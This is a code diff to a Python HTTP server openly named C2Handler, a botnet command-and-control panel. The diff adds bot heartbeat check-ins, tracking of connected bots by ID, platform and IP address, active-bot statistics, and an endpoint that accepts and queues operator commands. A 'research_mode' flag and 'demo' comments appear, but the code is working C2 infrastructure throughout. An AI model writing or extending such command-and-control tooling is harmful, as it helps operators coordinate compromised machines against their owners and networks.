@@ -10,8 +10,13 @@ import json
 import os
 import urllib.parse
 from datetime import datetime
+import time
 
 class C2Handler(http.server.SimpleHTTPRequestHandler):
+    # Simple in-memory storage for demo
+    connected_bots = {}
+    heartbeat_count = 0
+    
     def __init__(self, *args, **kwargs):
         super().__init__(*args, directory="/app/web", **kwargs)
     
@@ -38,14 +43,34 @@ class C2Handler(http.server.SimpleHTTPRequestHandler):
                 "status": "operational"
             })
         elif self.path == "/api/statistics":
+            # Count active bots (last seen within 2 minutes)
+            current_time = time.time()
+            active_bots = sum(1 for bot_data in self.connected_bots.values() 
+                             if current_time - bot_data.get('last_seen', 0) <= 120)
+            
             self.send_json({
-                "active_bots": 0,
-                "commands_today": 0,
-                "bytes_transferred": 0,
+                "active_bots": active_bots,
+                "commands_today": self.heartbeat_count,
+                "bytes_transferred": self.heartbeat_count * 512,  # Estimate
                 "server_start_time": datetime.now().isoformat()
             })
         elif self.path == "/api/bots":
-            self.send_json([])
+            # Return list of connected bots
+            bot_list = []
+            current_time = time.time()
+            for bot_id, bot_data in list(self.connected_bots.items()):
+                # Remove bots that haven't sent heartbeat in 2 minutes
+                if current_time - bot_data.get('last_seen', 0) > 120:
+                    del self.connected_bots[bot_id]
+                else:
+                    bot_list.append({
+                        'bot_id': bot_id,
+                        'platform': bot_data.get('platform', 'Unknown'),
+                        'ip_address': self.client_address[0],
+                        'last_seen': datetime.fromtimestamp(bot_data['last_seen']).isoformat(),
+                        'status': 'active'
+                    })
+            self.send_json(bot_list)
         elif self.path == "/api/activity/recent":
             self.send_json([{
                 "timestamp": datetime.now().isoformat(),
@@ -81,6 +106,74 @@ class C2Handler(http.server.SimpleHTTPRequestHandler):
             super().do_GET()
         else:
             super().do_GET()
+
+    def do_POST(self):
+        """Handle POST requests for bot communication"""
+        if self.path == "/api/heartbeat":
+            self.handle_heartbeat()
+        elif self.path == "/api/commands":
+            self.handle_command_submission()
+        else:
+            self.send_error(404, "Not Found")
+    
+    def handle_heartbeat(self):
+        """Handle bot heartbeat/check-in"""
+        try:
+            # Get content length
+            content_length = int(self.headers.get('Content-Length', 0))
+            if content_length > 0:
+                post_data = self.rfile.read(content_length)
+                bot_data = json.loads(post_data.decode('utf-8'))
+            else:
+                bot_data = {}
+            
+            # Extract bot info from headers (for simple clients)
+            bot_id = self.headers.get('X-Bot-ID', bot_data.get('bot_id', f'bot_{int(time.time())}'))
+            platform = self.headers.get('X-Platform', bot_data.get('platform', 'Unknown'))
+            
+            # Store/update bot info
+            self.connected_bots[bot_id] = {
+                'bot_id': bot_id,
+                'platform': platform,
+                'last_seen': time.time(),
+                'ip_address': self.client_address[0]
+            }
+            
+            self.heartbeat_count += 1
+            
+            print(f"[HEARTBEAT] Bot {bot_id} from {self.client_address[0]} - Platform: {platform}")
+            
+            # Send response
+            self.send_json({
+                "status": "success",
+                "message": "Heartbeat received",
+                "bot_id": bot_id,
+                "next_checkin": 30,
+                "research_mode": True
+            })
+            
+        except Exception as e:
+            print(f"[ERROR] Heartbeat handling failed: {e}")
+            self.send_error(500, "Internal Server Error")
+    
+    def handle_command_submission(self):
+        """Handle command submissions"""
+        try:
+            content_length = int(self.headers.get('Content-Length', 0))
+            post_data = self.rfile.read(content_length)
+            command_data = json.loads(post_data.decode('utf-8'))
+            
+            print(f"[COMMAND] Received command: {command_data}")
+            
+            self.send_json({
+                "status": "success", 
+                "message": "Command queued",
+                "command_id": f"cmd_{int(time.time())}"
+            })
+            
+        except Exception as e:
+            print(f"[ERROR] Command handling failed: {e}")
+            self.send_error(500, "Internal Server Error")
 
     def handle_client_download(self):
         platform = self.path.split("/")[-1]
